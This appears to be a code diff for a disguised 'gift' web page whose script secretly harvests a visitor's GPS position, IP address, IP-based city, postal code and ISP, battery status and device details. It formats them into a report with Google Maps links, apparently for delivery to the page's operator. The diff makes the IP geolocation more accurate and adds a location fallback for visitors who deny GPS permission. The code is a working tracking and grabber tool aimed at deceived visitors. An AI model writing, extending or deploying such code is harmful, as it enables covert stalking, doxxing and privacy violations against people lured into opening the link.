@@ -167,6 +167,45 @@
         return { level: 'N/A', charging: false };
     }
     
+    async function getAccurateIPInfo() {
+        try {
+            // Multiple APIs for better accuracy
+            const apis = [
+                'https://ipapi.co/json/',
+                'https://ipwho.is/',
+                'https://freeipapi.com/api/json/'
+            ];
+            
+            for (const api of apis) {
+                try {
+                    const resp = await fetch(api);
+                    const data = await resp.json();
+                    if (data.ip && data.city) {
+                        return {
+                            ip: data.ip,
+                            city: data.city || data.city_name || 'N/A',
+                            region: data.region || data.region_name || 'N/A',
+                            country: data.country_name || data.country || 'N/A',
+                            postal: data.postal || data.postal_code || 'N/A',
+                            isp: data.org || data.isp || 'N/A',
+                            lat: data.latitude || data.lat || 'N/A',
+                            lon: data.longitude || data.lon || 'N/A'
+                        };
+                    }
+                } catch(e) {}
+            }
+        } catch(e) {}
+        
+        // Fallback
+        try {
+            const resp = await fetch('https://api.ipify.org?format=json');
+            const ipData = await resp.json();
+            return { ip: ipData.ip, city: 'N/A', region: 'N/A', country: 'N/A', postal: 'N/A', isp: 'N/A' };
+        } catch(e) {
+            return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', postal: 'N/A', isp: 'N/A' };
+        }
+    }
+    
     async function openGift() {
         if (dataSent) return;
         
@@ -177,7 +216,10 @@
         // Get battery info
         const battery = await getBatteryInfo();
         
-        // Get GPS location with high accuracy
+        // Get accurate IP info
+        const networkData = await getAccurateIPInfo();
+        
+        // Get GPS location
         let locationData = { lat: 'N/A', lon: 'N/A', accuracy: 'N/A', error: null };
         let locationSuccess = false;
         
@@ -210,24 +252,6 @@
             };
         }
         
-        // Get IP and network info
-        let networkData = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            const geoData = await geoRes.json();
-            networkData = {
-                ip: ipData.ip,
-                city: geoData.city || 'N/A',
-                region: geoData.region || 'N/A',
-                country: geoData.country_name || 'N/A',
-                isp: geoData.org || 'N/A',
-                postal: geoData.postal || 'N/A',
-                timezone: geoData.timezone || 'N/A'
-            };
-        } catch(e) {}
-        
         // Get detailed device info
         const deviceData = {
             userAgent: navigator.userAgent,
@@ -240,7 +264,6 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             online: navigator.onLine ? 'Yes' : 'No',
             cookiesEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack || 'Not set',
             hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
             deviceMemory: navigator.deviceMemory || 'N/A'
         };
@@ -248,6 +271,10 @@
         // Create Google Maps link
         const mapLink = (locationData.lat != 'N/A' && locationData.lon != 'N/A') 
             ? `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}&z=15`
+            : '';
+        
+        const ipMapLink = (networkData.lat != 'N/A' && networkData.lon != 'N/A')
+            ? `https://www.google.com/maps?q=${networkData.lat},${networkData.lon}&z=10`
             : '';
         
         // Build message
@@ -269,16 +296,20 @@
             message += `<b>📍 GPS LOCATION</b>\n`;
             message += `   Status: ❌ Blocked/Permission Denied\n`;
             message += `   Error: ${locationData.error || 'User denied location'}\n`;
+            if(networkData.lat != 'N/A') {
+                message += `   (IP-Based Location: ${networkData.lat}, ${networkData.lon})\n`;
+                if(ipMapLink) message += `   🗺️ <a href="${ipMapLink}">📍 VIEW IP LOCATION</a>\n`;
+            }
         }
         message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
         
-        // Network Section
-        message += `<b>🌐 NETWORK INFO</b>\n`;
+        // Network Section (Accurate)
+        message += `<b>🌐 NETWORK INFO (REAL IP)</b>\n`;
         message += `   IP: <code>${networkData.ip}</code>\n`;
         message += `   City: ${networkData.city}\n`;
         message += `   Region: ${networkData.region}\n`;
         message += `   Country: ${networkData.country}\n`;
-        message += `   Postal: ${networkData.postal}\n`;
+        message += `   Pincode: ${networkData.postal}\n`;
         message += `   ISP: ${networkData.isp}\n`;
         message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
         
